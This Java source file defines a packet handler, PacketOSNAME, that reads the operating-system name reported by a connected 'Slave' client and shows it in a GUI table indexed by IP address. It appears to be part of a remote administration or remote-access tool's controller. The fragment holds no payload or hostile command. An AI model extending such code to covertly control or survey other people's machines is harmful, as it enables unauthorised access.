package com.redpois0n.packets;

import com.redpois0n.Slave;
import com.redpois0n.ui.frames.Frame;
import com.redpois0n.util.Util;

public class PacketOSNAME extends Packet {

	@Override
	public void read(Slave slave, String line) throws Exception {
		slave.setOperatingSystem(slave.readLine());
		Frame.mainModel.setValueAt(slave.getOperatingSystem(), Util.getRow(3, slave.getIP()), 6);
	}

}
